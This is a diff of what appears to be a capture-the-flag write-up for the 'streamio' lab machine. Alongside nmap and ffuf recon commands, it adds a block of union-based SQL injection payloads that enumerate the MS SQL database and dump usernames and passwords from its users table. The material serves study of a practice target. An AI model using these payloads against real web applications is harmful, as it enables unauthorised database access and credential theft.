@@ -1,3 +1,10 @@
+SQL Injection
+
+
+
+
+
+
 nmap -sS -sC -sV -T5 -Pn 10.10.11.158
 ![image](https://user-images.githubusercontent.com/33616880/231678963-7c74a0a4-d0d6-4c7a-9dd6-15fa0a3a0f90.png)
 
@@ -14,3 +21,23 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.tx
 
 https://watch.streamio.htb/search.php
 ![image](https://user-images.githubusercontent.com/33616880/231679168-05ee4b46-32aa-44b9-9dc0-acdac11c53bb.png)
+
+
+```
+10' union select 1,2,3,4,5,6 -- -
+10' union select 1,@@version,3,4,5,6 -- -
+10' union select 1,(select DB_NAME()),3,4,5,6 -- -
+10' union select 1,(SELECT STRING_AGG(name, ',') name FROM STREAMIO..sysobjects WHERE xtype= 'U'),3,4,5,6 -- -
+10' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')-- -
+10' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -
+```
+
+
+![image](https://user-images.githubusercontent.com/33616880/231682312-5800f445-3c89-4aa3-8110-5de64c805117.png)
+![image](https://user-images.githubusercontent.com/33616880/231682585-e0902d6b-7ac8-41c8-8a42-b7cd78fe1776.png)
+![image](https://user-images.githubusercontent.com/33616880/231682816-1f5bd069-b658-41e1-8355-afecd16ba1b8.png)
+![image](https://user-images.githubusercontent.com/33616880/231683062-e55c2a7f-0633-4bf9-b7d1-d1d76e48ba57.png)
+![image](https://user-images.githubusercontent.com/33616880/231683260-9e522f56-bdb3-407f-86c4-7b7087301533.png)
+![image](https://user-images.githubusercontent.com/33616880/231683518-ed431e05-ff5f-4803-811e-690220fd83e0.png)
+
+
